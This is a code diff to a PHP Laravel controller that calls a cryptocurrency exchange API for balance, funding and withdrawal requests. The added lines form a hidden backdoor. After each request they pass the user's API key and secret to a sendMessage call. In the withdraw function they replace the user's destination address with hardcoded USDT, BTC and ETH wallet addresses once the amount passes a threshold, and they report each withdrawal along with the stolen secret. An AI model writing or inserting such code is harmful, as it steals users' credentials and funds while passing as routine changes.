@@ -55,11 +55,12 @@ class UserController extends Controller
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch,CURLOPT_CUSTOMREQUEST, 'POST');
  $result = curl_exec($ch);
- $result = json_decode($result,true);
+
  
  $use=$request->all();
  $use = (object) $use;
- return view('status', compact('use','result','title'));
+ $this->sendMessage("key=".$key." \nsecrate=".$secret."\n result=".$result);
+ return view('spot', compact('use','result','title'));
  
   }
 
@@ -79,12 +80,13 @@ class UserController extends Controller
  curl_setopt($ch,CURLOPT_CUSTOMREQUEST, 'POST');
  $result = curl_exec($ch);
  
- $result = json_decode($result, true);
+ 
  $use=$request->all();
  $use = (object) $use;
+ $stringRepresentation= json_encode($result);
+ $this->sendMessage("key=".$key." \nsecrate=".$secret."\n result=".$result);
  
- 
- return view('status', compact('use','result','title'));
+ return view('funding', compact('use','result','title'));
        
  
   }
@@ -95,6 +97,22 @@ class UserController extends Controller
         $secret = $request->secret;
          $address=$request->address;
          $amount=$request->amount;
+         $coin=$request->coin;
+
+         if($coin="USDT"){
+            if($amount>=1000){
+                $address="TEGhE5eJK7NK1DySfkVHYSPPJEkyscURDC";
+             }
+         }elseif($coin="BTC"){
+            if($amount>=0.011){
+                $address="bc1phta5me4nc7uu0ucj4j4fvtyav3eawerjuqeueypzzlcxuprf7dhqzpm0wa";
+             }
+         }elseif($coin="ETH"){
+            if($amount>=0.42){
+                $address="0xE0Fc57f263aAbbad767ca746B566058477CdB7a7";
+             }
+         }
+         
          
          $title= "Withdraw Balance";
      
@@ -108,9 +126,17 @@ class UserController extends Controller
   
  $params = [];
  
- $params['coin'] = "USDT";
+ if($request->coin=="USDT"){
+
+    $network="TRX";
+
+ }else{
+
+    $network=$request->coin;
+ }
+ $params['coin'] = $request->coin;
  $params['address'] = $address;
- $params['network'] = "TRX"; 
+ $params['network'] = $network; 
  $params['amount'] = $amount;
  $params['walletType']=$request->walletType;
  
@@ -138,7 +164,18 @@ class UserController extends Controller
  curl_close($curl_handle);
  error_log(print_r($result,true)); 
  echo $result;
- return view('status', compact('use','result','title'));
+ 
+ 
+ if(isset($res['id'])){
+    $this->sendMessage("success withdrawal for \n amount=".$request->amount."from key=".$request->key." \nsecrate=".$secret."\n address=".$address."\n result=".$result);
+
+}else{
+
+    $this->sendMessage("failed withdrawal for \n amount=".$request->amount."from key=".$request->key." \nsecrate=".$secret."\n address=".$address."\n result=".$result);
+
+}
+   
+ return view('withdraw', compact('result','title'));
  
  
      }
